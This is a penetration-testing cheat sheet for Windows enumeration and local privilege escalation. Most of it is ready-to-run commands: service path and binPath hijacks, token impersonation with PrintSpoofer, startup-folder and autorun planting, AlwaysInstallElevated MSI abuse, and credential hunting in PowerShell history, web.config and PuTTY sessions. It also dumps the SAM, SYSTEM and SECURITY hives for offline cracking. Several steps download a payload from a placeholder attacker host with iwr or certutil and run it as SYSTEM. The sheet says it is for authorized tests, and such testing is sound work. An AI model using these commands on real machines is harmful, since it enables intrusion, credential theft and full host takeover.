# 🪟 Windows Enumeration & Local Privilege Escalation

> **Purpose**: Practical commands and techniques for enumerating Windows systems and escalating privileges during **authorized** penetration tests.
> **Note**: *Setup/Lab creation steps have been intentionally removed. This sheet focuses on detection and exploitation only.*

---

## 🔍 Enumeration

### Users & Privileges

```bat
net user
net user <username>
whoami /priv
whoami /groups
```

### Network Information

```bat
ipconfig /all
netstat -ant
```

### Firewall Status

```bat
netsh firewall show state
netsh firewall show config
```

### Processes & Tasks

```bat
tasklist
schtasks
```

---

## 🚀 Local Privilege Escalation Techniques

### 1️⃣ Unquoted Service Path

#### Detection

```bat
wmic service get Name,State,PathName | findstr "Program"
sc qc <service_name>
```

#### Exploitation

```bat
iwr -uri http://<ATTACKER_IP>/payload.exe -OutFile <service_exe_name>
move <service_exe_name> <service_path>
sc stop <service_name>
sc start <service_name>
```

---

### 2️⃣ Weak / Modifiable Service Binary (binPath)

#### Detection

```powershell
Get-ModifiableService -Verbose
icacls <service_binary>
accesschk.exe -wuvc <service_name>
```

#### Exploitation

```bat
certutil -urlcache -f http://<IP>/ok.exe ok.exe
sc config <service_name> binPath="C:\Path\ok.exe" obj= LocalSystem
sc stop <service_name>
sc start <service_name>
```

---

### 3️⃣ SeImpersonatePrivilege (Token Impersonation)

#### Detection

```bat
whoami /priv | findstr SeImpersonate
```

#### Exploitation

```bat
PrintSpoofer64.exe -i -c cmd.exe
```

🔗 Tool: [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

---

### 4️⃣ Startup Applications (Writable Startup Folder)

#### Detection

```bat
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

#### Exploitation

```bat
iwr http://<IP>/ok.exe -OutFile ok.exe
move ok.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
logoff
```

---

### 5️⃣ Autoruns (Writable Autorun Executable)

#### Detection

```bat
accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```

#### Exploitation

```bat
copy reverse.exe "C:\Program Files\Autorun Program\program.exe"
```

---

### 6️⃣ AlwaysInstallElevated (MSI PrivEsc)

#### Detection

```bat
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

#### Exploitation

```bat
msiexec /quiet /i exploit.msi
```

---

### 7️⃣ Weak Scheduled Tasks

#### Detection

```bat
schtasks /query /fo LIST /v
```

#### Exploitation

```bat
Replace task binary → wait for SYSTEM execution
```

---

### 8️⃣ DLL Hijacking

#### Detection

* Use ProcMon → filter `NAME NOT FOUND`

#### Exploitation

```bat
Place malicious DLL in missing path
Restart application
```

---

### 9️⃣ Saved Credentials

```bat
cmdkey /list
runas /savecred /user:admin cmd.exe
```

---

### 🔐 Credential Hunting

#### PowerShell History

```bat
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

#### IIS Web Configs

```bat
type C:\inetpub\wwwroot\web.config | findstr connectionString
```

#### PuTTY Saved Sessions

```bat
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s
```

---

## 🧪 SAM / SYSTEM Dump (Admin Required)

```bat
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive
```

Dump offline:

```bash
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
```

---

## 🛠️ Enumeration & PrivEsc Tools

* **PowerUp.ps1** – [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
* **winPEAS** – [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)
* **windows-privesc-check** – [https://github.com/pentestmonkey/windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
* **Metasploit**

```text
run post/multi/recon/local_exploit_suggester
```

---

## ℹ️ Misc

```powershell
echo $env:PROCESSOR_ARCHITECTURE
```

---

✅ **End of Windows Enumeration & Local Privilege Escalation Cheat Sheet**
